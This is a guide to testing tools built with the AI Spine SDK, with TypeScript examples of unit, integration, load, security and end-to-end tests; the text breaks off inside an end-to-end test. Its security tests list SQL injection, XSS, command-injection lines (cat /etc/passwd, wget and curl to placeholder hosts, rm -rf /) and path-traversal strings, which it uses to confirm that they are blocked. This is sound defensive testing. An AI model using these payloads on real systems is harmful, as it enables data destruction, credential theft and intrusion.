# Testing Strategies

This guide covers comprehensive testing approaches for AI Spine tools, including unit testing, integration testing, performance testing, and testing utilities provided by the SDK. Thorough testing ensures your tools are reliable, secure, and performant.

## Table of Contents

- [Testing Philosophy](#testing-philosophy)
- [Unit Testing](#unit-testing)
- [Integration Testing](#integration-testing)
- [Performance Testing](#performance-testing)
- [Security Testing](#security-testing)
- [End-to-End Testing](#end-to-end-testing)
- [Testing Utilities](#testing-utilities)
- [Mock and Stub Patterns](#mock-and-stub-patterns)
- [Test Data Generation](#test-data-generation)
- [CI/CD Integration](#cicd-integration)

---

## Testing Philosophy

### Test Pyramid

Follow the testing pyramid for comprehensive coverage:

```typescript
// Unit Tests (70-80%) - Fast, isolated, focused
describe('Field Validation', () => {
  test('should validate email format', async () => {
    const field = emailField().required().build();
    const result = await validateField(field, 'user@example.com');
    expect(result.success).toBe(true);
  });
});

// Integration Tests (15-25%) - Components working together
describe('Tool Integration', () => {
  test('should execute tool with valid input', async () => {
    const result = await testTool(weatherTool, {
      input: { city: 'Madrid' },
      config: { apiKey: 'test-key' }
    });
    expect(result.status).toBe('success');
  });
});

// E2E Tests (5-15%) - Full system testing
describe('API Integration', () => {
  test('should handle complete request-response cycle', async () => {
    const response = await request(app)
      .post('/api/execute')
      .send({ input_data: { city: 'London' } })
      .expect(200);
    
    expect(response.body.status).toBe('success');
  });
});
```

### Testing Principles

1. **Fast and Reliable** - Tests should run quickly and consistently
2. **Isolated** - Tests shouldn't depend on external services or each other
3. **Clear and Focused** - Each test should verify one specific behavior
4. **Maintainable** - Tests should be easy to understand and update

---

## Unit Testing

### Testing Tool Logic

Test individual tool functions in isolation:

```typescript
import { createTool, stringField, numberField } from '@ai-spine/tools';
import { testTool, createMockContext } from '@ai-spine/tools-testing';

describe('Calculator Tool', () => {
  let calculatorTool: any;

  beforeEach(() => {
    calculatorTool = createTool({
      metadata: {
        name: 'calculator',
        version: '1.0.0',
        description: 'Basic calculator operations',
        capabilities: ['math.basic']
      },

      schema: {
        input: {
          operation: stringField()
            .required()
            .enum(['add', 'subtract', 'multiply', 'divide'])
            .description('Math operation to perform'),
          
          a: numberField()
            .required()
            .description('First number'),
          
          b: numberField()
            .required()
            .description('Second number')
        },

        config: {}
      },

      execute: async (input, config, context) => {
        const { operation, a, b } = input;
        let result: number;

        switch (operation) {
          case 'add':
            result = a + b;
            break;
          case 'subtract':
            result = a - b;
            break;
          case 'multiply':
            result = a * b;
            break;
          case 'divide':
            if (b === 0) {
              return {
                status: 'error',
                error: {
                  code: 'DIVISION_BY_ZERO',
                  message: 'Cannot divide by zero',
                  type: 'validation_error'
                }
              };
            }
            result = a / b;
            break;
          default:
            return {
              status: 'error',
              error: {
                code: 'INVALID_OPERATION',
                message: 'Unsupported operation',
                type: 'validation_error'
              }
            };
        }

        return {
          status: 'success',
          data: {
            operation,
            operands: [a, b],
            result,
            precision: Number.isInteger(result) ? 0 : 2
          },
          timing: {
            executionTimeMs: Date.now() - context.performance!.startTime,
            startedAt: new Date(context.performance!.startTime).toISOString(),
            completedAt: new Date().toISOString()
          }
        };
      }
    });
  });

  describe('Basic Operations', () => {
    test('should add two numbers correctly', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'add', a: 5, b: 3 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBe(8);
      expect(result.data.operation).toBe('add');
      expect(result.data.operands).toEqual([5, 3]);
    });

    test('should subtract numbers correctly', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'subtract', a: 10, b: 4 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBe(6);
    });

    test('should multiply numbers correctly', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'multiply', a: 6, b: 7 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBe(42);
    });

    test('should divide numbers correctly', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'divide', a: 15, b: 3 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBe(5);
    });
  });

  describe('Error Handling', () => {
    test('should handle division by zero', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'divide', a: 10, b: 0 },
        config: {}
      });

      expect(result.status).toBe('error');
      expect(result.error?.code).toBe('DIVISION_BY_ZERO');
      expect(result.error?.message).toBe('Cannot divide by zero');
      expect(result.error?.type).toBe('validation_error');
    });

    test('should handle invalid operation', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'power', a: 2, b: 3 },
        config: {}
      });

      expect(result.status).toBe('error');
      expect(result.error?.code).toBe('INVALID_OPERATION');
    });
  });

  describe('Input Validation', () => {
    test('should reject missing required fields', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'add', a: 5 }, // Missing 'b'
        config: {}
      });

      expect(result.status).toBe('error');
      expect(result.error?.type).toBe('validation_error');
    });

    test('should reject invalid operation type', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'invalid', a: 5, b: 3 },
        config: {}
      });

      expect(result.status).toBe('error');
      expect(result.error?.type).toBe('validation_error');
    });

    test('should reject non-numeric inputs', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'add', a: 'not-a-number', b: 3 },
        config: {}
      });

      expect(result.status).toBe('error');
      expect(result.error?.type).toBe('validation_error');
    });
  });

  describe('Edge Cases', () => {
    test('should handle very large numbers', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'add', a: Number.MAX_SAFE_INTEGER, b: 1 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBe(Number.MAX_SAFE_INTEGER + 1);
    });

    test('should handle decimal precision', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'divide', a: 1, b: 3 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBeCloseTo(0.333333, 6);
      expect(result.data.precision).toBe(2);
    });

    test('should handle negative numbers', async () => {
      const result = await testTool(calculatorTool, {
        input: { operation: 'multiply', a: -5, b: -3 },
        config: {}
      });

      expect(result.status).toBe('success');
      expect(result.data.result).toBe(15);
    });
  });

  describe('Performance', () => {
    test('should complete simple operations quickly', async () => {
      const startTime = Date.now();
      
      const result = await testTool(calculatorTool, {
        input: { operation: 'add', a: 1, b: 2 },
        config: {}
      });

      const executionTime = Date.now() - startTime;
      
      expect(result.status).toBe('success');
      expect(executionTime).toBeLessThan(100); // Should complete in <100ms
      expect(result.timing?.executionTimeMs).toBeLessThan(50);
    });
  });
});
```

### Testing Field Validation

Test individual field validation logic:

```typescript
import { 
  validateField, 
  stringField, 
  numberField, 
  emailField, 
  arrayField 
} from '@ai-spine/tools';

describe('Field Validation', () => {
  describe('String Fields', () => {
    test('should validate required string fields', async () => {
      const field = stringField().required().build();
      
      const validResult = await validateField(field, 'valid string', 'test');
      expect(validResult.success).toBe(true);
      
      const invalidResult = await validateField(field, '', 'test');
      expect(invalidResult.success).toBe(false);
      
      const nullResult = await validateField(field, null, 'test');
      expect(nullResult.success).toBe(false);
    });

    test('should validate string length constraints', async () => {
      const field = stringField()
        .required()
        .minLength(3)
        .maxLength(10)
        .build();

      const tooShortResult = await validateField(field, 'ab', 'test');
      expect(tooShortResult.success).toBe(false);
      expect(tooShortResult.errors?.[0]?.message).toContain('minimum');

      const tooLongResult = await validateField(field, 'this is too long', 'test');
      expect(tooLongResult.success).toBe(false);
      expect(tooLongResult.errors?.[0]?.message).toContain('maximum');

      const validResult = await validateField(field, 'valid', 'test');
      expect(validResult.success).toBe(true);
    });

    test('should validate string patterns', async () => {
      const field = stringField()
        .required()
        .pattern('^[a-zA-Z]+$') // Only letters
        .build();

      const validResult = await validateField(field, 'ValidString', 'test');
      expect(validResult.success).toBe(true);

      const invalidResult = await validateField(field, 'Invalid123', 'test');
      expect(invalidResult.success).toBe(false);
    });

    test('should validate email format', async () => {
      const field = emailField().required().build();

      const validEmails = [
        'user@example.com',
        'test.email+tag@domain.co.uk',
        'simple@test.org'
      ];

      const invalidEmails = [
        'not-an-email',
        '@domain.com',
        'user@',
        'user..double.dot@example.com'
      ];

      for (const email of validEmails) {
        const result = await validateField(field, email, 'email');
        expect(result.success).toBe(true);
      }

      for (const email of invalidEmails) {
        const result = await validateField(field, email, 'email');
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Number Fields', () => {
    test('should validate number ranges', async () => {
      const field = numberField()
        .required()
        .min(0)
        .max(100)
        .build();

      const validResult = await validateField(field, 50, 'score');
      expect(validResult.success).toBe(true);

      const tooLowResult = await validateField(field, -1, 'score');
      expect(tooLowResult.success).toBe(false);

      const tooHighResult = await validateField(field, 101, 'score');
      expect(tooHighResult.success).toBe(false);
    });

    test('should validate integer requirement', async () => {
      const field = numberField()
        .required()
        .integer()
        .build();

      const validResult = await validateField(field, 42, 'count');
      expect(validResult.success).toBe(true);

      const invalidResult = await validateField(field, 42.5, 'count');
      expect(invalidResult.success).toBe(false);
    });
  });

  describe('Array Fields', () => {
    test('should validate array length constraints', async () => {
      const field = arrayField(stringField().required().build())
        .required()
        .minItems(1)
        .maxItems(3)
        .build();

      const validResult = await validateField(field, ['item1', 'item2'], 'list');
      expect(validResult.success).toBe(true);

      const emptyResult = await validateField(field, [], 'list');
      expect(emptyResult.success).toBe(false);

      const tooManyResult = await validateField(field, ['1', '2', '3', '4'], 'list');
      expect(tooManyResult.success).toBe(false);
    });

    test('should validate array item types', async () => {
      const field = arrayField(numberField().required().min(0).build())
        .required()
        .build();

      const validResult = await validateField(field, [1, 2, 3], 'numbers');
      expect(validResult.success).toBe(true);

      const invalidResult = await validateField(field, [1, 'not-a-number', 3], 'numbers');
      expect(invalidResult.success).toBe(false);
    });

    test('should validate unique items constraint', async () => {
      const field = arrayField(stringField().required().build())
        .required()
        .unique()
        .build();

      const validResult = await validateField(field, ['a', 'b', 'c'], 'unique');
      expect(validResult.success).toBe(true);

      const duplicateResult = await validateField(field, ['a', 'b', 'a'], 'unique');
      expect(duplicateResult.success).toBe(false);
    });
  });
});
```

---

## Integration Testing

### Testing Tool Integration

Test how different components work together:

```typescript
import { createTool } from '@ai-spine/tools';
import { AISpineTestClient, startTestServer } from '@ai-spine/tools-testing';

describe('Weather Tool Integration', () => {
  let weatherTool: any;
  let testClient: AISpineTestClient;
  let server: any;

  beforeAll(async () => {
    weatherTool = createTool({
      metadata: {
        name: 'weather-integration-test',
        version: '1.0.0',
        description: 'Weather tool for integration testing',
        capabilities: ['weather.current']
      },

      schema: {
        input: {
          city: stringField()
            .required()
            .minLength(2)
            .maxLength(50)
            .description('City name')
        },

        config: {
          apiKey: apiKeyField()
            .required()
            .pattern('^test-[a-f0-9]{8}$')
            .description('Weather API key')
        }
      },

      execute: async (input, config, context) => {
        // Simulate weather API call
        const weatherData = {
          city: input.city,
          temperature: Math.round(Math.random() * 40 - 10), // -10 to 30
          description: ['sunny', 'cloudy', 'rainy', 'snowy'][Math.floor(Math.random() * 4)],
          humidity: Math.round(Math.random() * 100),
          windSpeed: Math.round(Math.random() * 20)
        };

        return {
          status: 'success',
          data: weatherData,
          timing: {
            executionTimeMs: Date.now() - context.performance!.startTime,
            startedAt: new Date(context.performance!.startTime).toISOString(),
            completedAt: new Date().toISOString()
          }
        };
      }
    });

    // Start test server
    server = await startTestServer(weatherTool, {
      port: 0, // Use random available port
      security: {
        requireAuth: true,
        apiKeys: ['test-client-key-12345']
      }
    });

    // Create test client
    testClient = new AISpineTestClient({
      baseUrl: `http://localhost:${server.port}`,
      apiKey: 'test-client-key-12345'
    });
  });

  afterAll(async () => {
    await server.close();
  });

  describe('HTTP API Integration', () => {
    test('should handle valid execute request', async () => {
      const response = await testClient.execute({
        input_data: { city: 'Madrid' },
        config: { apiKey: 'test-12345678' }
      });

      expect(response.status).toBe('success');
      expect(response.data).toHaveProperty('city', 'Madrid');
      expect(response.data).toHaveProperty('temperature');
      expect(response.data).toHaveProperty('description');
      expect(response.timing).toHaveProperty('executionTimeMs');
      expect(typeof response.timing.executionTimeMs).toBe('number');
    });

    test('should reject invalid input data', async () => {
      const response = await testClient.execute({
        input_data: { city: '' }, // Empty city name
        config: { apiKey: 'test-12345678' }
      });

      expect(response.status).toBe('error');
      expect(response.error?.type).toBe('validation_error');
    });

    test('should reject invalid configuration', async () => {
      const response = await testClient.execute({
        input_data: { city: 'London' },
        config: { apiKey: 'invalid-key-format' }
      });

      expect(response.status).toBe('error');
      expect(response.error?.type).toBe('validation_error');
    });
  });

  describe('Health Check Integration', () => {
    test('should return healthy status', async () => {
      const health = await testClient.getHealth();

      expect(health.status).toBe('healthy');
      expect(health.version).toBe('1.0.0');
      expect(health.tool_metadata.name).toBe('weather-integration-test');
      expect(health.capabilities).toContain('weather.current');
      expect(typeof health.uptime_seconds).toBe('number');
    });
  });

  describe('Schema Documentation Integration', () => {
    test('should return complete schema information', async () => {
      const schema = await testClient.getSchema();

      expect(schema.metadata).toHaveProperty('name', 'weather-integration-test');
      expect(schema.metadata).toHaveProperty('capabilities');
      expect(schema.schema).toHaveProperty('input');
      expect(schema.schema).toHaveProperty('config');
      expect(schema.schema.input).toHaveProperty('city');
      expect(schema.schema.config).toHaveProperty('apiKey');
    });

    test('should include OpenAPI documentation', async () => {
      const schema = await testClient.getSchema();

      expect(schema).toHaveProperty('openapi');
      expect(schema.openapi).toHaveProperty('openapi', '3.0.3');
      expect(schema.openapi).toHaveProperty('info');
      expect(schema.openapi).toHaveProperty('paths');
      expect(schema.openapi.paths).toHaveProperty('/api/execute');
    });
  });

  describe('Error Handling Integration', () => {
    test('should handle missing authentication', async () => {
      const clientWithoutAuth = new AISpineTestClient({
        baseUrl: `http://localhost:${server.port}`
        // No API key
      });

      await expect(clientWithoutAuth.execute({
        input_data: { city: 'Paris' },
        config: { apiKey: 'test-12345678' }
      })).rejects.toThrow();
    });

    test('should handle malformed requests', async () => {
      const response = await fetch(`http://localhost:${server.port}/api/execute`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer test-client-key-12345'
        },
        body: 'invalid json'
      });

      expect(response.status).toBe(400);
      const errorData = await response.json();
      expect(errorData.success).toBe(false);
      expect(errorData.error).toContain('JSON');
    });
  });

  describe('Performance Integration', () => {
    test('should complete requests within time limits', async () => {
      const startTime = Date.now();

      const response = await testClient.execute({
        input_data: { city: 'Tokyo' },
        config: { apiKey: 'test-12345678' }
      });

      const totalTime = Date.now() - startTime;

      expect(response.status).toBe('success');
      expect(totalTime).toBeLessThan(5000); // Should complete in <5s
      expect(response.timing.executionTimeMs).toBeLessThan(1000); // Tool execution <1s
    });

    test('should handle concurrent requests', async () => {
      const concurrentRequests = 10;
      const requests = Array(concurrentRequests).fill(0).map(async (_, i) => {
        return testClient.execute({
          input_data: { city: `City${i}` },
          config: { apiKey: 'test-12345678' }
        });
      });

      const responses = await Promise.all(requests);

      expect(responses).toHaveLength(concurrentRequests);
      responses.forEach((response, i) => {
        expect(response.status).toBe('success');
        expect(response.data.city).toBe(`City${i}`);
      });
    });
  });
});
```

### Database Integration Testing

Test tools that interact with databases:

```typescript
import { createTestDatabase, seedTestData } from '@ai-spine/tools-testing';

describe('User Management Tool - Database Integration', () => {
  let testDb: any;
  let userTool: any;

  beforeAll(async () => {
    // Create isolated test database
    testDb = await createTestDatabase({
      type: 'postgresql',
      host: 'localhost',
      port: 5433, // Different port for test
      database: 'test_ai_spine_tools',
      username: 'test_user',
      password: 'test_pass'
    });

    // Seed with test data
    await seedTestData(testDb, {
      users: [
        { id: 1, email: 'user1@test.com', name: 'User One', active: true },
        { id: 2, email: 'user2@test.com', name: 'User Two', active: false }
      ]
    });

    userTool = createTool({
      // ... tool definition with database operations
      execute: async (input, config, context) => {
        // Database operations using testDb
        const users = await testDb.query('SELECT * FROM users WHERE active = $1', [input.active]);
        return { status: 'success', data: { users } };
      }
    });
  });

  afterAll(async () => {
    await testDb.close();
  });

  beforeEach(async () => {
    // Reset database state before each test
    await testDb.truncate(['users']);
    await seedTestData(testDb, {
      users: [
        { id: 1, email: 'user1@test.com', name: 'User One', active: true },
        { id: 2, email: 'user2@test.com', name: 'User Two', active: false }
      ]
    });
  });

  test('should retrieve active users', async () => {
    const result = await testTool(userTool, {
      input: { active: true },
      config: { databaseUrl: testDb.connectionString }
    });

    expect(result.status).toBe('success');
    expect(result.data.users).toHaveLength(1);
    expect(result.data.users[0].email).toBe('user1@test.com');
  });

  test('should handle database connection errors', async () => {
    const invalidTool = createTool({
      // Tool with invalid database config
      execute: async (input, config, context) => {
        // This should fail
        const db = await connectToDatabase('invalid://connection');
        return { status: 'success', data: {} };
      }
    });

    const result = await testTool(invalidTool, {
      input: {},
      config: {}
    });

    expect(result.status).toBe('error');
    expect(result.error?.type).toBe('configuration_error');
  });
});
```

---

## Performance Testing

### Load Testing

Test tool performance under various load conditions:

```typescript
import { LoadTestRunner, PerformanceProfiler } from '@ai-spine/tools-testing';

describe('Weather Tool Performance', () => {
  let weatherTool: any;
  let loadRunner: LoadTestRunner;

  beforeAll(async () => {
    weatherTool = createTool({
      // ... weather tool definition
    });

    await weatherTool.start({ port: 0 });
    
    loadRunner = new LoadTestRunner({
      baseUrl: `http://localhost:${weatherTool.port}`,
      apiKey: 'test-key'
    });
  });

  afterAll(async () => {
    await weatherTool.stop();
  });

  describe('Single User Performance', () => {
    test('should complete simple requests quickly', async () => {
      const profiler = new PerformanceProfiler();
      profiler.start();

      const result = await testTool(weatherTool, {
        input: { city: 'Madrid' },
        config: { apiKey: 'test-key' }
      });

      const metrics = profiler.stop();

      expect(result.status).toBe('success');
      expect(metrics.totalTimeMs).toBeLessThan(100);
      expect(metrics.memoryUsageMB).toBeLessThan(50);
    });

    test('should handle complex requests within limits', async () => {
      const complexInput = {
        cities: Array(10).fill(0).map((_, i) => `City${i}`),
        includeDetails: true,
        includeHistory: true
      };

      const startTime = Date.now();
      const result = await testTool(weatherTool, {
        input: complexInput,
        config: { apiKey: 'test-key' }
      });
      const duration = Date.now() - startTime;

      expect(result.status).toBe('success');
      expect(duration).toBeLessThan(5000); // 5 second limit
    });
  });

  describe('Load Testing', () => {
    test('should handle moderate concurrent load', async () => {
      const loadTest = await loadRunner.runLoadTest({
        duration: 30000, // 30 seconds
        concurrentUsers: 10,
        requestsPerSecond: 5,
        
        scenario: {
          name: 'moderate-load',
          requests: [
            {
              endpoint: '/api/execute',
              method: 'POST',
              body: {
                input_data: { city: 'Madrid' },
                config: { apiKey: 'test-key' }
              }
            }
          ]
        }
      });

      expect(loadTest.successRate).toBeGreaterThan(0.95); // >95% success rate
      expect(loadTest.averageResponseTime).toBeLessThan(200); // <200ms average
      expect(loadTest.p95ResponseTime).toBeLessThan(500); // <500ms 95th percentile
      expect(loadTest.errorRate).toBeLessThan(0.05); // <5% error rate
    });

    test('should handle peak load gracefully', async () => {
      const peakLoadTest = await loadRunner.runLoadTest({
        duration: 60000, // 1 minute
        concurrentUsers: 50,
        requestsPerSecond: 20,
        
        scenario: {
          name: 'peak-load',
          rampUp: {
            duration: 10000, // Ramp up over 10 seconds
            pattern: 'linear'
          },
          
          requests: [
            {
              endpoint: '/api/execute',
              method: 'POST',
              body: {
                input_data: { city: 'London' },
                config: { apiKey: 'test-key' }
              },
              weight: 0.8 // 80% of requests
            },
            {
              endpoint: '/health',
              method: 'GET',
              weight: 0.2 // 20% of requests
            }
          ]
        }
      });

      expect(peakLoadTest.successRate).toBeGreaterThan(0.90); // >90% success rate
      expect(peakLoadTest.averageResponseTime).toBeLessThan(1000); // <1s average
      expect(peakLoadTest.throughput).toBeGreaterThan(15); // >15 req/s throughput
    });

    test('should recover from stress conditions', async () => {
      // First, apply stress
      const stressTest = await loadRunner.runLoadTest({
        duration: 30000,
        concurrentUsers: 100,
        requestsPerSecond: 50,
        
        scenario: {
          name: 'stress-test',
          requests: [
            {
              endpoint: '/api/execute',
              method: 'POST',
              body: {
                input_data: { city: 'Tokyo' },
                config: { apiKey: 'test-key' }
              }
            }
          ]
        }
      });

      // Allow recovery time
      await new Promise(resolve => setTimeout(resolve, 10000));

      // Test recovery with normal load
      const recoveryTest = await loadRunner.runLoadTest({
        duration: 20000,
        concurrentUsers: 5,
        requestsPerSecond: 2,
        
        scenario: {
          name: 'recovery-test',
          requests: [
            {
              endpoint: '/api/execute',
              method: 'POST',
              body: {
                input_data: { city: 'Paris' },
                config: { apiKey: 'test-key' }
              }
            }
          ]
        }
      });

      expect(recoveryTest.successRate).toBeGreaterThan(0.95); // Should recover
      expect(recoveryTest.averageResponseTime).toBeLessThan(300); // Back to normal
    });
  });

  describe('Memory and Resource Testing', () => {
    test('should not have memory leaks', async () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      // Run many operations
      for (let i = 0; i < 1000; i++) {
        await testTool(weatherTool, {
          input: { city: `City${i}` },
          config: { apiKey: 'test-key' }
        });
      }

      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }

      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      const increasePercentage = (memoryIncrease / initialMemory) * 100;

      expect(increasePercentage).toBeLessThan(50); // <50% memory increase
    });

    test('should limit resource usage', async () => {
      const resourceMonitor = new ResourceMonitor();
      resourceMonitor.start();

      await testTool(weatherTool, {
        input: { 
          city: 'Berlin',
          includeHistory: true,
          includeDetailed: true 
        },
        config: { apiKey: 'test-key' }
      });

      const resources = resourceMonitor.stop();

      expect(resources.maxMemoryMB).toBeLessThan(100); // <100MB memory
      expect(resources.maxCpuPercent).toBeLessThan(80); // <80% CPU
    });
  });
});
```

---

## Security Testing

### Automated Security Testing

Test for common security vulnerabilities:

```typescript
import { SecurityTestSuite } from '@ai-spine/tools-testing';

describe('Security Testing', () => {
  let securityTool: any;
  let securityTests: SecurityTestSuite;

  beforeAll(async () => {
    securityTool = createTool({
      // Tool with potential security vulnerabilities for testing
      schema: {
        input: {
          query: stringField().required().sanitize(),
          userInput: stringField().optional()
        },
        config: {
          apiKey: apiKeyField().required()
        }
      },
      
      execute: async (input, config, context) => {
        return { status: 'success', data: { processed: input.query } };
      }
    });

    await securityTool.start({ port: 0 });
    securityTests = new SecurityTestSuite(securityTool);
  });

  afterAll(async () => {
    await securityTool.stop();
  });

  describe('Input Validation Security', () => {
    test('should prevent SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "UNION SELECT password FROM users WHERE username='admin'",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const result = await securityTests.testSQLInjection({
          input: { query: payload },
          config: { apiKey: 'test-key' }
        });

        expect(result.blocked).toBe(true);
        expect(result.vulnerabilityDetected).toBe(false);
      }
    });

    test('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(document.cookie)',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const result = await securityTests.testXSS({
          input: { query: payload },
          config: { apiKey: 'test-key' }
        });

        expect(result.blocked).toBe(true);
        expect(result.sanitized).toBe(true);
        expect(result.vulnerabilityDetected).toBe(false);
      }
    });

    test('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; cat /etc/passwd',
        '| wget malicious-site.com',
        '&& rm -rf /',
        '`curl evil.com`',
        '$((curl evil.com))'
      ];

      for (const payload of commandInjectionPayloads) {
        const result = await securityTests.testCommandInjection({
          input: { query: payload },
          config: { apiKey: 'test-key' }
        });

        expect(result.blocked).toBe(true);
        expect(result.commandExecuted).toBe(false);
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd'
      ];

      for (const payload of pathTraversalPayloads) {
        const result = await securityTests.testPathTraversal({
          input: { query: payload },
          config: { apiKey: 'test-key' }
        });

        expect(result.blocked).toBe(true);
        expect(result.fileAccessed).toBe(false);
      }
    });
  });

  describe('Authentication Security', () => {
    test('should enforce API key authentication', async () => {
      const result = await securityTests.testAuthenticationBypass();
      expect(result.bypassSuccessful).toBe(false);
      expect(result.requiresAuthentication).toBe(true);
    });

    test('should validate API key format', async () => {
      const invalidApiKeys = [
        '',
        'invalid-format',
        '123',
        'too-short',
        'contains-invalid-chars-!'
      ];

      for (const apiKey of invalidApiKeys) {
        const result = await securityTests.testApiKeyValidation(apiKey);
        expect(result.valid).toBe(false);
        expect(result.accepted).toBe(false);
      }
    });

    test('should implement rate limiting', async () => {
      const result = await securityTests.testRateLimit({
        requestCount: 200,
        timeWindow: 60000, // 1 minute
        expectedLimit: 100
      });

      expect(result.rateLimited).toBe(true);
      expect(result.blockedRequests).toBeGreaterThan(0);
    });
  });

  describe('Data Protection', () => {
    test('should not expose sensitive information in errors', async () => {
      const result = await securityTests.testInformationLeakage({
        input: { query: 'trigger-error' },
        config: { apiKey: 'invalid-key-format' }
      });

      expect(result.sensitiveDataExposed).toBe(false);
      expect(result.errorMessage).not.toContain('password');
      expect(result.errorMessage).not.toContain('apiKey');
      expect(result.errorMessage).not.toContain('secret');
    });

    test('should sanitize logged data', async () => {
      const sensitiveInput = {
        query: 'search term',
        userInput: 'password123',
        creditCard: '4111-1111-1111-1111'
      };

      const result = await securityTests.testDataSanitization(sensitiveInput);
      
      expect(result.dataSanitized).toBe(true);
      expect(result.loggedData).not.toContain('password123');
      expect(result.loggedData).not.toContain('4111-1111-1111-1111');
    });
  });

  describe('Network Security', () => {
    test('should enforce HTTPS in production', async () => {
      const result = await securityTests.testHTTPSEnforcement();
      expect(result.httpsRequired).toBe(true);
      expect(result.redirectsToHttps).toBe(true);
    });

    test('should implement proper CORS policies', async () => {
      const result = await securityTests.testCORSConfiguration();
      expect(result.corsConfigured).toBe(true);
      expect(result.allowsAllOrigins).toBe(false);
    });

    test('should include security headers', async () => {
      const result = await securityTests.testSecurityHeaders();
      
      const requiredHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security'
      ];

      requiredHeaders.forEach(header => {
        expect(result.headers).toHaveProperty(header);
      });
    });
  });
});
```

---

## End-to-End Testing

### Complete Workflow Testing

Test entire user workflows:

```typescript
import { E2ETestRunner, createTestEnvironment } from '@ai-spine/tools-testing';

describe('E2E: Complete AI Agent Workflow', () => {
  let testEnvironment: any;
  let e2eRunner: E2ETestRunner;

  beforeAll(async () => {
    // Set up complete test environment
    testEnvironment = await createTestEnvironment({
      tools: [
        { name: 'weather-tool', port: 3001 },
        { name: 'email-tool', port: 3002 },
        { name: 'calendar-tool', port: 3003 }
      ],
      mockServices: {
        weatherAPI: { port: 8001, responses: 'fixtures/weather-responses.json' },
        emailService: { port: 8002, responses: 'fixtures/email-responses.json' }
      }
    });

    e2eRunner = new E2ETestRunner(testEnvironment);
  });

  afterAll(async () => {
    await testEnvironment.cleanup();
  });

  test('AI Agent: Weather Report and Email Notification', async () => {
    // Simulate AI agent workflow:
    // 1. Get weather for multiple cities
    // 2. Generate summary email
    // 3. Send email notification

    const workflow = e2eRunner.createWorkflow('weather-email-notification');

    // Step 1: Get weather data
    const weatherResults = await workflow.step('get-weather', async () => {
      const cities = ['Madrid', 'London', 'Paris', 'Berlin'];
      const weatherPromises = cities.map(city =>
        testEnvironment.callTool('weather-tool', {
          input_data: { city },
          config: { apiKey: 'test-weather-key' }
        })
      );

      return Promise.all(weatherPromises);
    });

    expect(weatherResults).toHaveLength(4);
    weatherResults.forEach(result => {
      expect(result.status).toBe('success');
      expect(result.data).toHaveProperty('temperature');
      expect(result.data).toHaveProperty('description');
    });

    // Step 2: Process weather data
    const emailContent = await workflow.step('process-data', () => {
      const summary = weatherResults.map(result => ({
        city: result.data.city,
        temperature: result.data.temperature,
        description: result.data.description
      }));

      return {
        subject: 'Daily Weather Summary',
        body: `Weather Report:\n\n${summary.map(s => 
          `${s.city}: ${s.temperature}°C, ${s.description}`
        ).join('\n')}`,
        recipients: ['user@example.com']
      };
    });

    // Step 3: Send email
    const emailResult = await workflow.step('send-email', () => {
      return testEnvironment.callTool('email-tool', {
        input_data: emailContent,
        config: { 
          apiKey: 'test-email-key',
          smtpServer: 'test-smtp.example.com'
        }
      });
    });

    expect(emailResult.status).toBe('success');
    expect(emailResult.data).toHaveProperty('messageId');

    // Verify workflow metrics
    const workflowMetrics = workflow.getMetrics();
    expect(workflowMetrics.totalSteps).toBe(3);
    expect(workflowMetrics.successfulSteps).toBe(3);
    expect(workflowMetrics.totalExecutionTime).toBeLessThan(10000); // <10s
  });

  test('AI Agent: Error Recovery Workflow', async () => {
    // Test how AI agent handles failures and retries

    const workflow = e2eRunner.createWorkflow('error-recovery');

    // Step 1: Attempt operation that may fail
    let attempt = 0;
    const resilientOperation = await workflow.stepWithRetry(
      'resilient-api-call',
      async () => {
        attempt++;
        
        if (attempt < 3) {
          // Simulate transient failure
          throw new Error('Temporary service unavailable');
        }

        return testEnvironment.callTool('weather-tool', {
          input_data: { city: 'Amsterdam' },
          config: { apiKey: 'test-weather-key' }
        });
      },
      {
        maxRetries: 3,
        retryDelay: 1000,
        backoffMultiplier: 2
      }
    );

    expect(resilientOperation.status).toBe('success');
    expect(attempt).toBe(3); // Should succeed on third attempt

    // Step 2: Fallback operation
    const fallbackResult = await workflow.stepWithFallback(
      'primary-operation',
      async () => {
        // This will fail
        throw new Error('Primary service unavailable');
      },
      async () => {
        // Fallback succeeds
        return { status: 'success', data: { source: 'fallback' } };
      }
    );

    expect(fallbackResult.data.source).toBe('fallback');

